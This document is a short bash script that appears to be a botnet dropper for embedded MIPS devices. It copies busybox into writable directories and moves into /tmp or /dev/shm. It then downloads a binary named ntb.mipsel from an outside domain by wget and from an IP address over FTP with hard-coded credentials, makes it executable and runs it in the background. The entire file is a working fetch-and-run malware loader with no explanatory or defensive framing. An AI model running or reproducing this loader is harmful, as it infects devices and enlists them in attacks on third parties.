#!/bin/bash
ulimit -n 65535 2>/dev/null || true
cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /
busybox wget http://store.risesmp.cc/wow/ntb.mipsel
busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mipsel ntb.mipsel
chmod 777 ntb.mipsel
./ntb.mipsel femboysploit &
